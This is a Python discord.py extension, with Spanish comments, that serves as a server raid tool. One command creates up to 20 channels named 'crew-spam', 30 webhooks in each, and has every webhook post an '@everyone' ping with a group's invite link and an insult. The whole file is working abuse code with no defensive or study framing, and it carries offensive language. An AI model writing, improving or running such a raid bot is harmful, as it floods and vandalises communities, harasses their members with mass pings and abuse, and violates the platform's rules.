import discord
from discord.ext import commands
import random
import asyncio

# Número de canales y webhooks a crear
CHANNEL_COUNT = 20
WEBHOOK_COUNT = 30
SPAM_MESSAGE = "@everyone discord.gg/bardo | crew is here, fucker."

class WebhookSpam(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def webhook(self, ctx):
        guild = ctx.guild
        existing_channels = [channel for channel in guild.text_channels]

        # Seleccionar canales al azar o crear los que falten
        if len(existing_channels) >= CHANNEL_COUNT:
            selected_channels = random.sample(existing_channels, CHANNEL_COUNT)
        else:
            selected_channels = existing_channels
            for i in range(CHANNEL_COUNT - len(existing_channels)):
                try:
                    channel = await guild.create_text_channel(f'crew-spam-{i}')
                    selected_channels.append(channel)
                    print(f"Canal {channel.name} creado.")
                except discord.Forbidden:
                    print("No tengo permisos para crear canales en este servidor.")
                    return
                except discord.HTTPException as e:
                    print(f"Error al crear canal: {e}")
                    return

        # Crear y spamear webhooks simultáneamente
        await asyncio.gather(*(self.create_and_spam_webhooks(channel) for channel in selected_channels))

    async def create_and_spam_webhooks(self, channel):
        for i in range(WEBHOOK_COUNT):
            try:
                webhook = await channel.create_webhook(name=f"CrewWebhook-{i}")
                print(f"Webhook {webhook.name} creado en {channel.name}.")
                # Iniciar el spam inmediatamente después de crear el webhook
                asyncio.create_task(self.send_spam(webhook))
            except discord.Forbidden:
                print(f"No tengo permisos para crear webhooks en el canal {channel.name}.")
                return
            except discord.HTTPException as e:
                print(f"Error al crear webhook en el canal {channel.name}: {e}")
                return

    async def send_spam(self, webhook):
        try:
            await webhook.send(SPAM_MESSAGE)
        except discord.HTTPException as e:
            print(f"Error al spamear el webhook: {e}")

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(WebhookSpam(bot))
